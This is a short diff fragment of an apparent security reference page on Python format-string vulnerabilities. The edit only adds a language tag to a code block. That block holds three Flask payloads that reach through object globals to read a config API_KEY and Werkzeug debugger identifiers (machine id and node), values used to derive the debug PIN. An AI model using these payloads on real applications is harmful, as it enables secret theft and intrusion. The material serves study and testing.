@@ -21,7 +21,7 @@ A **format string** vulnerability in Python occurs when user input is directly p
 
 ### Flask
 
-```
+```python
 {self.__init__.__globals__[config][API_KEY]}
 {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
 {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
